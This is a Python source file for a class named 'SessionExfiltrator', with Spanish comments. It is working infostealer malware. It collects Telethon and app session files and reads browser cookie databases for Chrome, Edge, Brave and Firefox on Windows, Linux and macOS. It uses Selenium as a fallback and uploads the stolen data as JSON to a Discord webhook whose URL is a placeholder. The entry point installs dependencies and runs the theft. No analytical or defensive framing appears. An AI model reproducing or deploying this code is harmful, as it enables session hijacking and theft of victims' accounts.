import os
import requests
import base64
import json
from pathlib import Path
from datetime import datetime
import shutil
import tempfile
import sqlite3
import platform
from typing import Dict, List
import subprocess
import time

class SessionExfiltrator:
    """Exfiltra sesiones y cookies de navegadores sin pywin32"""
    
    def __init__(self, discord_webhook_url: str):
        self.webhook_url = discord_webhook_url
        self.chunk_size = 20 * 1024 * 1024  # 20MB por chunk
        self.project_dir = Path(__file__).parent.parent
        self.system = platform.system()
    
    def get_app_sessions(self) -> dict:
        """Obtiene SOLO las sesiones de la aplicación"""
        sessions = {}
        
        session_files = [
            "session_bot.session",  # Telethon
            "hacoo.session",        # Hacoo
        ]
        
        print("\n   🔍 Escaneando directorio del proyecto...")
        
        for session_file in session_files:
            session_path = self.project_dir / session_file
            if session_path.exists():
                try:
                    file_size = session_path.stat().st_size
                    sessions[session_file] = session_path
                    print(f"   ✅ {session_file} encontrado! ({file_size} bytes)")
                except Exception as e:
                    print(f"   ❌ Error leyendo {session_file}: {e}")
        
        return sessions
    
    # ===== EXTRACCION DE COOKIES CON SELENIUM =====
    def _extract_cookies_selenium(self, browser_type: str = "chrome") -> Dict[str, str]:
        """
        Extrae cookies usando Selenium + webdriver_manager
        Sin necesidad de pywin32
        """
        cookies = {}
        
        try:
            from selenium import webdriver
            from selenium.webdriver.common.by import By
            from selenium.webdriver.support.ui import WebDriverWait
            from selenium.webdriver.support import expected_conditions as EC
            from webdriver_manager.chrome import ChromeDriverManager
            from webdriver_manager.firefox import GeckoDriverManager
            from webdriver_manager.microsoft import EdgeChromiumDriverManager
            from selenium.webdriver.chrome.service import Service
        except ImportError:
            print(f"   ⚠️  Falta: pip install selenium webdriver_manager")
            return cookies
        
        driver = None
        try:
            print(f"   🚀 Abriendo {browser_type}...")
            
            if browser_type.lower() == "chrome":
                options = webdriver.ChromeOptions()
                options.add_argument("--no-sandbox")
                options.add_argument("--disable-dev-shm-usage")
                options.add_argument("--disable-blink-features=AutomationControlled")
                service = Service(ChromeDriverManager().install())
                driver = webdriver.Chrome(service=service, options=options)
            
            elif browser_type.lower() == "firefox":
                options = webdriver.FirefoxOptions()
                options.add_argument("--no-sandbox")
                service = Service(GeckoDriverManager().install())
                driver = webdriver.Firefox(service=service, options=options)
            
            elif browser_type.lower() == "edge":
                options = webdriver.EdgeOptions()
                options.add_argument("--no-sandbox")
                service = Service(EdgeChromiumDriverManager().install())
                driver = webdriver.Edge(service=service, options=options)
            
            # Navegar a un sitio para activar cookies
            print(f"   📍 Cargando cookies...")
            driver.get("https://www.google.com")
            time.sleep(2)
            
            # Extraer cookies
            browser_cookies = driver.get_cookies()
            for cookie in browser_cookies:
                try:
                    cookie_name = cookie.get('name', '')
                    cookie_value = cookie.get('value', '')
                    domain = cookie.get('domain', 'unknown')
                    cookies[f"{domain}:{cookie_name}"] = cookie_value
                except:
                    pass
            
            print(f"   ✅ {len(cookies)} cookies extraídas vía Selenium!")
            
        except Exception as e:
            print(f"   ❌ Error con Selenium {browser_type}: {e}")
        
        finally:
            if driver:
                try:
                    driver.quit()
                except:
                    pass
        
        return cookies
    
    # ===== EXTRACCION DIRECTA DE SQLITE (sin encriptación DPAPI) =====
    def _extract_cookies_sqlite(self, browser_path: Path, browser_name: str) -> Dict[str, str]:
        """
        Extrae cookies directamente de base de datos SQLite
        Funciona en navegadores sin encriptación fuerte
        """
        cookies = {}
        
        try:
            if browser_name == "Chrome" or browser_name == "Edge" or browser_name == "Brave":
                cookies_db = browser_path / "Default" / "Cookies"
                query = "SELECT host_key, name, value FROM cookies"
            elif browser_name == "Firefox":
                cookies_db = None
                # Buscar en perfiles
                profiles_dir = browser_path / "Profiles"
                if profiles_dir.exists():
                    for profile in profiles_dir.iterdir():
                        cookies_db = profile / "cookies.sqlite"
                        if cookies_db.exists():
                            break
                query = "SELECT host, name, value FROM moz_cookies"
            else:
                return cookies
            
            if not cookies_db or not cookies_db.exists():
                return cookies
            
            # Copiar DB (algunos navegadores la mantienen abierta)
            temp_db = Path(tempfile.gettempdir()) / f"cookies_{browser_name}_{datetime.now().strftime('%H%M%S')}"
            shutil.copy2(cookies_db, temp_db)
            
            # Conectar y leer
            conn = sqlite3.connect(temp_db)
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            
            try:
                cursor.execute(query)
                rows = cursor.fetchall()
                
                for row in rows:
                    if browser_name == "Firefox":
                        host, name, value = row[0], row[1], row[2]
                        cookies[f"{host}:{name}"] = value
                    else:
                        host_key, name, value = row[0], row[1], row[2]
                        cookies[f"{host_key}:{name}"] = value
            except Exception as e:
                print(f"   ⚠️  Error en query: {e}")
            
            conn.close()
            temp_db.unlink()
            
            if cookies:
                print(f"   ✅ {len(cookies)} cookies de {browser_name} extraídas!")
            
        except Exception as e:
            print(f"   ⚠️  Error extrayendo {browser_name}: {e}")
        
        return cookies
    
    # ===== RECOLECTAR TODAS LAS COOKIES =====
    def collect_all_cookies(self) -> Dict[str, Dict]:
        """Recolecta cookies de todos los navegadores disponibles"""
        all_cookies = {}
        
        print("\n   🍪 Extrayendo cookies de navegadores...\n")
        
        if self.system == "Windows":
            home = Path.home()
            
            # Chrome
            chrome_path = home / "AppData" / "Local" / "Google" / "Chrome" / "User Data"
            if chrome_path.exists():
                print("   📍 Procesando Chrome...")
                all_cookies["Chrome"] = self._extract_cookies_sqlite(chrome_path, "Chrome")
            
            # Edge
            edge_path = home / "AppData" / "Local" / "Microsoft" / "Edge" / "User Data"
            if edge_path.exists():
                print("   📍 Procesando Edge...")
                all_cookies["Edge"] = self._extract_cookies_sqlite(edge_path, "Edge")
            
            # Brave
            brave_path = home / "AppData" / "Local" / "BraveSoftware" / "Brave-Browser" / "User Data"
            if brave_path.exists():
                print("   📍 Procesando Brave...")
                all_cookies["Brave"] = self._extract_cookies_sqlite(brave_path, "Brave")
            
            # Firefox
            firefox_path = home / "AppData" / "Roaming" / "Mozilla" / "Firefox"
            if firefox_path.exists():
                print("   📍 Procesando Firefox...")
                all_cookies["Firefox"] = self._extract_cookies_sqlite(firefox_path, "Firefox")
        
        elif self.system == "Linux":
            home = Path.home()
            
            # Firefox (Linux)
            firefox_path = home / ".mozilla" / "firefox"
            if firefox_path.exists():
                print("   📍 Procesando Firefox...")
                all_cookies["Firefox"] = self._extract_cookies_sqlite(firefox_path, "Firefox")
            
            # Chromium (Linux)
            chrome_path = home / ".config" / "google-chrome"
            if chrome_path.exists():
                print("   📍 Procesando Chrome...")
                all_cookies["Chrome"] = self._extract_cookies_sqlite(chrome_path, "Chrome")
            
            # Brave (Linux)
            brave_path = home / ".config" / "BraveSoftware" / "Brave-Browser"
            if brave_path.exists():
                print("   📍 Procesando Brave...")
                all_cookies["Brave"] = self._extract_cookies_sqlite(brave_path, "Brave")
        
        elif self.system == "Darwin":  # macOS
            home = Path.home()
            
            # Chrome (macOS)
            chrome_path = home / "Library" / "Application Support" / "Google" / "Chrome"
            if chrome_path.exists():
                print("   📍 Procesando Chrome...")
                all_cookies["Chrome"] = self._extract_cookies_sqlite(chrome_path, "Chrome")
            
            # Firefox (macOS)
            firefox_path = home / "Library" / "Application Support" / "Firefox"
            if firefox_path.exists():
                print("   📍 Procesando Firefox...")
                all_cookies["Firefox"] = self._extract_cookies_sqlite(firefox_path, "Firefox")
        
        return all_cookies
    
    def _extract_with_selenium_fallback(self) -> Dict[str, str]:
        """Fallback: extrae cookies via Selenium si SQLite falla"""
        print("\n   🔄 Usando Selenium como fallback...\n")
        
        all_cookies = {}
        
        for browser in ["chrome", "firefox", "edge"]:
            print(f"   📍 Intentando {browser}...")
            cookies = self._extract_cookies_selenium(browser)
            if cookies:
                all_cookies[browser.capitalize()] = cookies
        
        return all_cookies
    
    def send_to_discord(self, data: dict, label: str) -> bool:
        """Envía datos a Discord"""
        if not data:
            print("   ⚠️  No hay datos para enviar")
            return False
        
        try:
            # Convertir a JSON
            json_data = json.dumps(data, indent=2, ensure_ascii=False)
            
            # Crear archivo temporal
            temp_file = Path(tempfile.gettempdir()) / f"{label}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            with open(temp_file, 'w', encoding='utf-8') as f:
                f.write(json_data)
            
            # Enviar a Discord
            with open(temp_file, 'rb') as f:
                files = {'file': (temp_file.name, f)}
                payload = {
                    "content": f"🚨 **{label}** - {datetime.now().isoformat()}\n📦 Tamaño: {len(json_data)} bytes"
                }
                
                print(f"   📤 Enviando {label}...")
                response = requests.post(self.webhook_url, data=payload, files=files, timeout=10)
                response.raise_for_status()
                print(f"   ✅ Enviado correctamente!")
            
            temp_file.unlink()
            return True
        
        except Exception as e:
            print(f"   ❌ Error en envío: {e}")
            return False
    
    def exfiltrate_all(self) -> bool:
        """Exfiltra sesiones + cookies"""
        print("[🔴 EXFILTRATION PROTOCOL] Iniciando captura...\n")
        
        try:
            # 1. Sesiones de app
            sessions = self.get_app_sessions()
            if sessions:
                print(f"\n   📊 Sesiones encontradas: {len(sessions)}")
                self.send_to_discord(
                    {k: str(v) for k, v in sessions.items()},
                    "APP_SESSIONS"
                )
            
            # 2. Cookies de navegadores
            cookies = self.collect_all_cookies()
            
            # Si no hay cookies, intenta con Selenium
            if not cookies or not any(cookies.values()):
                print("\n   ⚠️  No se encontraron cookies en SQLite")
                cookies = self._extract_with_selenium_fallback()
            
            if cookies:
                # Filtrar cookies vacías
                cookies_filtered = {k: v for k, v in cookies.items() if v}
                if cookies_filtered:
                    self.send_to_discord(cookies_filtered, "BROWSER_COOKIES")
            
            print("\n[✅ EXFILTRATION] Protocolo completado")
            return True
        
        except Exception as e:
            print(f"\n[❌ EXFILTRATION FAILED] Error: {e}")
            return False


# ===== INSTALACION DE DEPENDENCIAS =====
def install_requirements():
    """Instala dependencias necesarias"""
    dependencies = [
        "requests",
        "pycryptodome",
        "selenium",
        "webdriver_manager"
    ]
    
    print(f"\n⚙️  Instalando dependencias...\n")
    for package in dependencies:
        print(f"   📦 Instalando {package}...")
        os.system(f"pip install {package}")
    
    print("\n✅ Dependencias instaladas!")


if __name__ == "__main__":
    # Ejemplo de uso
    DISCORD_WEBHOOK = "TU_WEBHOOK_AQUI"
    
    # Instalar dependencias
    install_requirements()
    
    # Ejecutar exfiltración
    exfil = SessionExfiltrator(DISCORD_WEBHOOK)
    exfil.exfiltrate_all()